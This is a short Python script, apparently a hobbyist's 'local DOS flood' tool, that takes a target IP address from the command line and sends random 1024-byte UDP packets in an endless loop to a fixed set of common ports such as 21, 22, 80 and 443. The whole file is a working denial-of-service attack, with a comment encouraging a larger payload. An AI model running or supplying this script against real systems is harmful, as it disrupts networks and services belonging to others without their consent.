#Thanks to Steve Tale whose book allowed me to write this
#Written by FoxSinOfGreed1729
import socket
import random
import sys

if len(sys.argv)<2:
    print("Syntax local_DOS_flood.py <ip address of the device you want to flood>")
    exit()
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #udp is a connectionless protocol that will allow us to spam target with UDP packets

package=random._urandom(1024) #random packet generator, you can increase this if you want to ;)

ip=sys.argv[1]
ports={21,22,23,24,25,26,27,80,143,443,} #common ports
n=1
while 1:
    for port in ports:
        sock.sendto(package,(ip,port))
    print("Sent ",n," Packets to ",ip)
    n=n+1
